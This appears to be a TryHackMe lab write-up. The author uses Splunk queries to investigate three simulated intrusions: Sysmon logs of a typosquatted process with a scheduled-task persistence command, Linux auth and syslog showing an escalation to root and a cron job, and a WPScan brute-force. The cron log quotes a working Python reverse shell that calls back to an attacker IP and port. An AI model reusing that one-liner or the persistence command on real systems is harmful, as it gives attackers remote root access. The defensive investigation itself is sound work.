---
title: "TryHackMe: Log Analysis with SIEM (Splunk) Writeup"
date: 2026-09-23 14:00:00 +0300
categories: [SOC Operations, Log Analysis]
tags: [tryhackme, splunk, sysmon, auth-log, brute-force, wpscan, persistence]
description: "Investigating a Windows Sysmon intrusion, a Linux privilege-escalation + cron backdoor, and a WordPress brute-force campaign using Splunk SPL."
---

## Overview

This room hands you three separate incidents inside the same Splunk instance, each backed by a different log source: Windows Sysmon telemetry, Linux `auth.log`/`syslog`, and a web server `access.log`. Below is how I worked through each one, with the reasoning behind each query.

---

## Task 1: Windows Endpoint Investigation (`index=task4`)

**Scenario:** an alert flagged a suspicious network connection on port `5678` from host `WIN-105`.

### Which IP address was the connection established with?

I filtered directly on the port:

```spl
index=task4 DestinationPort=5678
```

One event came back, a Sysmon `EventCode=3` (network connection) pointing to `10.10.114.80`.

![Sysmon EventCode=3 event showing DestinationIp 10.10.114.80 and DestinationPort 5678](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task1-network-event-detail-1.png)
![Event field list scrolled down, showing SourceIp and SourceName](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task1-network-event-detail-2.png)
![Event field list scrolled further, confirming index=task4](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task1-network-event-detail-3.png)

### Which process initiated this suspicious connection?

Instead of running a separate search for the process, I extended the same query with the `Image` field on the same connection event. The process name was already sitting right there in the record: **`SharePoInt.exe`**.

Worth flagging explicitly: that's a typosquat of the legitimate Microsoft `SharePoint.exe`, swapping a lowercase `l` for a capital `I`. It's the kind of detail that slips past a quick visual scan of a process list.

### What is the MD5 hash of the malicious process?

I filtered on `EventCode=1` (process creation) with the process name:

```spl
index=task4 EventCode=1 Image=*SharePoInt.exe* | table _time ComputerName Image MD5
```

The `MD5` column came back `null`. Splunk's default field extraction wasn't picking it up cleanly from the raw Sysmon message.

![Statistics table showing MD5 field returning null](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task1-md5-null.png)

Rather than fight the extraction, I narrowed the query with the full `CommandLine` to isolate the exact event, then opened the raw log directly. The `Hashes` field there had everything the table view didn't:

```
Hashes: MD5=770D14FFA142F09730B415506249E7D1,SHA256=...,IMPHASH=...
```

**MD5: `770D14FFA142F09730B415506249E7D1`**, run from `C:\Windows\Temp\SharePoInt.exe` under `WIN-105\Ben Foster`, spawned from `explorer.exe`. That parent process is consistent with the user double-clicking something, not a remote exploit.

![Query narrowed with full CommandLine to isolate the exact process-creation event](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task1-commandline-query.png)
![Raw Sysmon event showing the Hashes field with the MD5 and ParentImage=explorer.exe](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task1-raw-hash-event.png)

### What is the name of the scheduled task that was created on the system?

A payload dropped in `\Temp\` is usually meant to survive a reboot. Rather than search for scheduled-task creation in isolation, I built a broader correlation query around the suspicious directory, pulling in process creation, network connections, and file creation events together:

```spl
index=* (EventCode=1 OR EventCode=3 OR EventCode=11) "C:\\Windows\\Temp\\*"
| table _time, EventCode, Image, CommandLine, DestinationIp, DestinationPort
```

That single table reconstructed the whole timeline: the process starting, the connection to `10.10.114.80:5678`, and `schtasks.exe` registering a scheduled task:

```
schtasks /create /sc onlogon /tn "Office365 Install" /tr "C:\Windows\Temp\SharePoInt.exe" /ru "Ben Foster"
```

**Task name: `Office365 Install`.** Another name picked to blend into normal admin noise. `/sc onlogon` means it fires on every logon for that user, which is lightweight persistence that doesn't need admin rights to register.

![Correlated table of process, network, and file events reconstructing the schtasks persistence timeline](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task1-scheduled-task-correlation.png)

---

## Task 2: Linux Privilege Escalation & Persistence (`index=task5`)

**Scenario:** the alert already named the suspect, a new `remote-ssh` account, possibly created for persistence, on an Ubuntu server. So the goal here wasn't discovery, it was confirmation and timeline reconstruction.

### What was the timestamp of the remote-ssh account creation?

```spl
index=task5 source="auth.log" "useradd remote-ssh" | table _time user
```

**Timestamp: `2025-08-12 09:52:57.170`.**

![Search result showing the useradd remote-ssh event timestamp](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task2-useradd-timestamp.png)

### Which user successfully escalated their privileges to root prior to that?

A rogue account doesn't create itself, whoever did it needed root first. A root session opening around that time would be the sign of the escalation that made it possible, so I searched for that directly:

```spl
index=task5 source="auth.log" "session opened for user root" | table _time user
```

One relevant result at `09:49:52`, about three minutes before the `remote-ssh` account showed up. Opening the raw event confirmed who initiated it: `session opened for user root(uid=0) by jack-brown(uid=0)`.

![Statistics table listing the four root session events in auth.log](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task2-root-session-stats.png)
![Raw event confirming session opened for user root by jack-brown](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task2-root-session-raw.png)

### From which IP address did jack-brown successfully log in?

With the username in hand, I filtered directly on `jack-brown` instead of scanning every successful login in the file:

```spl
index=task5 source="auth.log" "Accepted password" jack-brown | table _time user clientip
```

**Attacker IP: `10.14.94.82`.**

![Raw event showing Accepted password for jack-brown from 10.14.94.82](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task2-accepted-password.png)

### How many failed login attempts occurred prior to this successful login?

A clean "Accepted password" line doesn't tell you whether that login was legitimate or guessed. So I pulled every failed attempt in the log:

```spl
index=task5 source="auth.log" "Failed password"
```

**4 failed attempts**, all from the same SSH session (`jack-brown` from `10.14.94.82`), compressed into a few seconds right before the successful login at `09:51:29`. Fast, consecutive failures followed by a success reads more like a targeted password guess than an innocent typo.

![List of Failed password events for jack-brown from 10.14.94.82 preceding the successful login](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task2-failed-password-attempts.png)

### Which port is the persistence mechanism configured to connect to?

With the rogue account and the root escalation both confirmed, the next question was whether the attacker had also set up something to run automatically, independent of any active session. `cron` is the classic persistence spot on Linux for exactly that reason, so I searched `syslog` for cron activity:

```spl
index=task5 sourcetype=syslog ("CRON" OR "cron") 7654 | table _time host _raw
```

That surfaced a cron job running as `root`, executing a Python reverse shell:

```
CRON[3042]: (root) CMD (/usr/bin/python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.33.31",7654));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);' >> /tmp/cron_output.log 2>&1)
```

**Persistence port: `7654`**, calling back to `10.10.33.31`, running as root. A fully interactive shell handed to the attacker on a schedule, which is the actual objective behind the earlier account creation and privilege escalation.

![Raw cron event showing the Python reverse shell connecting to 10.10.33.31 on port 7654](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task2-cron-reverse-shell.png)

---

## Task 3: Web Application Brute-Force (`index=task6`)

**Scenario:** an alert flagged a spike in activity on the organization's web server.

### Which URI path had the highest number of requests?

Since the question was specifically which URI took the most traffic, I didn't need a separate `stats`/`top` query. I used Splunk's built-in field sidebar: clicking `uri_path` in the fields panel opens a "Top Values" report directly.

**`/wp-login.php`, 586 requests, 78.55% of all traffic.** A ratio like that doesn't happen under normal usage.

![Top Values report for uri_path showing wp-login.php at 586 requests, 78.55%](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task3-uri-path-top-values.png)

### Which IP address was the source of the activity?

Same approach for the source: clicking `clientip` in the sidebar and correlating it with the request volume already identified.

**Source IP: `10.10.243.134`.**

Expanding one of the matching events surfaced everything else in the same record without a further query: `method=POST` (consistent with repeated login submissions, not page views), and the `User-Agent` field.

**Tool: `WPScan v3.8.28`.**

WPScan showing up plainly in the User-Agent is about as unambiguous as attribution gets, the tool doesn't hide its identity by default. Combined with the request volume concentrated on a single endpoint, this classifies as an automated WordPress credential brute-force / enumeration campaign, not manual activity.

![Expanded event showing clientip 10.10.243.134, method=POST, and useragent WPScan v3.8.28](/assets/img/posts/2026-09-23-log-analysis-siem-splunk/task3-clientip-useragent.png)

---

